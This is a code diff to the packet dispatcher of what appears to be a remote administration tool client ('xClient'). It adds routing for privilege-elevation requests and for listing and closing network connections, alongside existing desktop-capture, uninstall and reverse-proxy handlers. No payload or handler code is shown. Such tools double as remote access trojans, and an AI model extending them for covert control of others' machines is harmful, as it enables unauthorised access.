@@ -31,6 +31,10 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleDoClientUninstall((ServerPackets.DoClientUninstall)packet, client);
             }
+            else if (type == typeof(ServerPackets.DoAskElevate))
+            {
+                CommandHandler.HandleDoAskElevate((ServerPackets.DoAskElevate)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetDesktop))
             {
                 CommandHandler.HandleGetDesktop((ServerPackets.GetDesktop)packet, client);
@@ -170,6 +174,14 @@ namespace xClient.Core.Packets
                      type == typeof(ReverseProxy.Packets.ReverseProxyDisconnect))
             {
                 ReverseProxyCommandHandler.HandleCommand(client, packet);
+            }
+            else if (type == typeof(ServerPackets.GetConnections))
+            {
+                CommandHandler.HandleGetConnections(client, (ServerPackets.GetConnections)packet);
+            }
+            else if (type == typeof(ServerPackets.DoCloseConnection))
+            {
+                CommandHandler.HandleDoCloseConnection(client, (ServerPackets.DoCloseConnection)packet);
             }
         }
     }
